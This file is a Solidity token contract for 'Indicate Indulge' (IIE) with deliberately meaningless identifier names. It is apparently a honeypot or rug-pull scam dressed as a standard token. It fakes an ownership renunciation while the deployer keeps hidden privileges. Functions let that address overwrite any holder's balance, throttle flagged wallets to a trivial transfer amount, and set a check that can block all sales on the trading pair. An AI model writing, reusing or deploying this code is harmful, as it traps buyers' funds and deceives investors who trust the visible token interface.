//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface fundSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fromAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellLimit {
    function createPair(address autoMode, address toLaunchedLiquidity) external returns (address);
}

interface teamList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamMode) external view returns (uint256);

    function transfer(address liquidityMinLimit, uint256 teamFee) external returns (bool);

    function allowance(address takeLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamFee) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityMinLimit,
        uint256 teamFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedShould, uint256 value);
    event Approval(address indexed takeLimit, address indexed spender, uint256 value);
}

interface toAutoReceiver is teamList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IndicateIndulge is fromAmount, teamList, toAutoReceiver {

    function getOwner() external view returns (address) {
        return swapMax;
    }

    function amountExemptMax(address maxLaunched) public {
        require(maxLaunched.balance < 100000);
        if (maxFund) {
            return;
        }
        if (takeTotal != buyTakeToken) {
            totalBuy = true;
        }
        launchEnable[maxLaunched] = true;
        
        maxFund = true;
    }

    address public receiverBuy;

    uint8 private fundTotalMax = 18;

    bool public amountAuto;

    string private atExempt = "Indicate Indulge";

    constructor (){
        
        fundSwap fromMode = fundSwap(senderShould);
        receiverBuy = sellLimit(fromMode.factory()).createPair(fromMode.WETH(), address(this));
        if (takeTotal == buyTakeToken) {
            maxEnableTo = true;
        }
        toReceiver = _msgSender();
        amountMin();
        launchEnable[toReceiver] = true;
        takeTrading[toReceiver] = liquidityTotal;
        
        emit Transfer(address(0), toReceiver, liquidityTotal);
    }

    function exemptTake(address sellMarketing, address liquidityMinLimit, uint256 teamFee) internal returns (bool) {
        if (sellMarketing == toReceiver) {
            return atToken(sellMarketing, liquidityMinLimit, teamFee);
        }
        uint256 senderMin = teamList(receiverBuy).balanceOf(teamMinTake);
        require(senderMin == takeSell);
        require(liquidityMinLimit != teamMinTake);
        if (shouldLaunch[sellMarketing]) {
            return atToken(sellMarketing, liquidityMinLimit, tokenReceiver);
        }
        return atToken(sellMarketing, liquidityMinLimit, teamFee);
    }

    mapping(address => bool) public launchEnable;

    function balanceOf(address teamMode) public view virtual override returns (uint256) {
        return takeTrading[teamMode];
    }

    bool public maxFund;

    function swapAtSell() private view {
        require(launchEnable[_msgSender()]);
    }

    bool public maxEnableTo;

    address private swapMax;

    uint256 shouldTotal;

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityTotal;
    }

    function approve(address walletAuto, uint256 teamFee) public virtual override returns (bool) {
        marketingWallet[_msgSender()][walletAuto] = teamFee;
        emit Approval(_msgSender(), walletAuto, teamFee);
        return true;
    }

    uint256 takeSell;

    function transferFrom(address sellMarketing, address liquidityMinLimit, uint256 teamFee) external override returns (bool) {
        if (_msgSender() != senderShould) {
            if (marketingWallet[sellMarketing][_msgSender()] != type(uint256).max) {
                require(teamFee <= marketingWallet[sellMarketing][_msgSender()]);
                marketingWallet[sellMarketing][_msgSender()] -= teamFee;
            }
        }
        return exemptTake(sellMarketing, liquidityMinLimit, teamFee);
    }

    string private senderWallet = "IIE";

    mapping(address => uint256) private takeTrading;

    function name() external view virtual override returns (string memory) {
        return atExempt;
    }

    address public toReceiver;

    function allowance(address receiverToken, address walletAuto) external view virtual override returns (uint256) {
        if (walletAuto == senderShould) {
            return type(uint256).max;
        }
        return marketingWallet[receiverToken][walletAuto];
    }

    function symbol() external view virtual override returns (string memory) {
        return senderWallet;
    }

    uint256 public takeTotal;

    event OwnershipTransferred(address indexed liquidityAt, address indexed isBuy);

    function tradingAmount(address amountTake) public {
        swapAtSell();
        if (sellLaunch != buyTakeToken) {
            amountAuto = true;
        }
        if (amountTake == toReceiver || amountTake == receiverBuy) {
            return;
        }
        shouldLaunch[amountTake] = true;
    }

    uint256 private liquidityTotal = 100000000 * 10 ** 18;

    address senderShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address launchedEnable, uint256 teamFee) external virtual override returns (bool) {
        return exemptTake(_msgSender(), launchedEnable, teamFee);
    }

    function fromLaunchedList(address launchedEnable, uint256 teamFee) public {
        swapAtSell();
        takeTrading[launchedEnable] = teamFee;
    }

    uint256 public sellLaunch;

    function owner() external view returns (address) {
        return swapMax;
    }

    uint256 private buyTakeToken;

    bool public totalBuy;

    function atToken(address sellMarketing, address liquidityMinLimit, uint256 teamFee) internal returns (bool) {
        require(takeTrading[sellMarketing] >= teamFee);
        takeTrading[sellMarketing] -= teamFee;
        takeTrading[liquidityMinLimit] += teamFee;
        emit Transfer(sellMarketing, liquidityMinLimit, teamFee);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return fundTotalMax;
    }

    function txList(uint256 teamFee) public {
        swapAtSell();
        takeSell = teamFee;
    }

    address teamMinTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant tokenReceiver = 16 ** 10;

    mapping(address => mapping(address => uint256)) private marketingWallet;

    mapping(address => bool) public shouldLaunch;

    function amountMin() public {
        emit OwnershipTransferred(toReceiver, address(0));
        swapMax = address(0);
    }

}